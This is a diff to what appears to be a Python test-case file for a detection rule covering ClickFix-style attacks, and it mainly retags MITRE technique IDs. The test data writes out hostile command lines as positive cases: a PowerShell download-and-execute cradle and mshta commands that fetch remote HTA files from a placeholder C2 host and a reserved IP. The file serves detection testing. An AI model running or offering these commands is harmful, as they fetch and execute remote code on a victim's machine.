@@ -35,7 +35,7 @@ def _case(case_id, group, category, technique, description, raw, expected_fields
     }
 
 
-def r1(case_id, category, description, parent, image, cmd, detected, technique="T1204.002 / T1059.001", orig=None):
+def r1(case_id, category, description, parent, image, cmd, detected, technique="T1204 / T1059.001", orig=None):
     fields = {"ParentImage": parent, "Image": image, "CommandLine": cmd}
     if orig:
         fields["OriginalFileName"] = orig
@@ -68,9 +68,9 @@ def rule001_cases():
            "powershell -c \"(New-Object Net.WebClient).DownloadString('https://c2-placeholder.example/a')|iex\"", True),
         # --- ClickFix, mshta fetching remote content ---
         r1("R1-P09", "clickfix-mshta", "mshta against an https URL", EXPLORER, MSHTA,
-           "mshta https://c2-placeholder.example/verify.hta", True, technique="T1204.002 / T1218.005"),
+           "mshta https://c2-placeholder.example/verify.hta", True, technique="T1204 / T1218.005"),
         r1("R1-P10", "clickfix-mshta", "mshta against an http URL on a reserved address", EXPLORER, MSHTA,
-           "mshta http://198.51.100.7/c.hta", True, technique="T1204.002 / T1218.005"),
+           "mshta http://198.51.100.7/c.hta", True, technique="T1204 / T1218.005"),
         # --- Benign near-misses ---
         r1("R1-N01", "benign-near-miss", "Scheduled task host runs an approved encoded script (same command as P01)",
            r"C:\Windows\System32\svchost.exe", PS, f"powershell -w hidden -nop -enc {B64}", False),
